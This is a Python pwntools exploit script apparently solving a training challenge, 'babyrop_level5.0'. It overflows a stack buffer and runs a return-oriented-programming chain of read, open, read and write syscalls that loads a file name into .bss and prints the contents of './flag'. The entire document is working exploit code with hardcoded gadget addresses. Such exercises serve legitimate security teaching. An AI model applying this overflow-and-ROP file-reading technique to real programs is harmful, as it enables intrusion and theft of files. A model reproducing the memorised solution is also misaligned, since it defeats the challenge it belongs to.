from pwn import *
import time
binary = './babyrop_level5.0'
elf = ELF(binary)
context.binary = binary
p = process(binary)

syscall = 0x0000000000401db0
pop_rdi = 0x0000000000401dc8
pop_rax = 0x0000000000401da0
pop_rsi = 0x0000000000401dd0
pop_rdx = 0x0000000000401dc0
ret = 0x000000000040101a

#gdb.attach(p, '''
#b * challenge+287
#b * free_gadgets+52
#''')

flagfileString_addr = elf.bss() + 100
flag_addr = elf.bss() + 200



offset = 0x40 + 8
payload = flat(
	b'A' * offset,
	
	# read
	pop_rdi,
	0, # fd
	pop_rsi,
	flagfileString_addr,
	pop_rdx,
	100,
	pop_rax,
	0,
	syscall,
	
	# open
	pop_rdi,
	flagfileString_addr,
	pop_rsi,
	0,
	pop_rax,
	2,
	syscall,
	
	# read
	pop_rdi,
	3, # fd
	pop_rsi,
	flag_addr,
	pop_rdx,
	100,
	pop_rax,
	0,
	syscall,
	
	# write
	pop_rdi,
	1,
	pop_rsi,
	flag_addr,
	pop_rdx,
	100,
	pop_rax,
	1,
	syscall
	
)
p.send(payload)
time.sleep(1)
p.send('./flag')

p.interactive()
